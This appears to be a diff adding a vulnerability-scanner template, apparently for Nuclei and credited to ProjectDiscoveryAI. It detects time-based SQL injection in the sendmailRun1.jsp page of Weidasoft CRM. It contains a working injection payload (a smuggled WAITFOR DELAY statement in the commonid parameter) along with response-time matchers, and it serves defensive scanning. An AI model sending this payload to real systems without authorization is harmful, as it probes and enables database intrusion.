@@ -1,0 +1,35 @@
+id: weidasoft-sendmailrun1-sqli
+info:
+  name: Weidasoft SendmailRun1.jsp SQL Injection
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  description: |
+    Detects SQL injection vulnerability in Weidasoft CRM system at sendmailRun1.jsp.
+
+variables:
+  t1: '{{rand_int(5,10)}}'
+  t2: '{{to_number(t1) + 2}}'
+
+http:
+  - raw:
+      - |
+        GET /wap/common/sendmailRun1.jsp?commonid=1%27%3BWAITFOR+DELAY+%270%3A0%3A{{t1}}%27--%2Bq HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "发送手机短信到相关人员"
+          - "公告标题"
+          - "写公告"
+        part: body
+      - type: dsl
+        dsl:
+          - "response_time > to_number(t1)"
+          - "response_time < to_number(t2)"
